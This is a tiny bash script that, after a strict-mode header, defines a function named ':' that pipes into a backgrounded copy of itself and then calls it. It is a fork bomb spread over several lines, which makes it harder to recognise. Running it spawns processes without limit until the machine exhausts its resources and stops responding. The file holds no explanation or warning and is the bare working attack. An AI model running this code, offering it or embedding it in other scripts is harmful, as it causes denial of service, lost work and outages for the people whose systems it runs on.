#!/bin/bash
unset IFS
set -eEuo pipefail

:() {
    : |
        : &
}
:
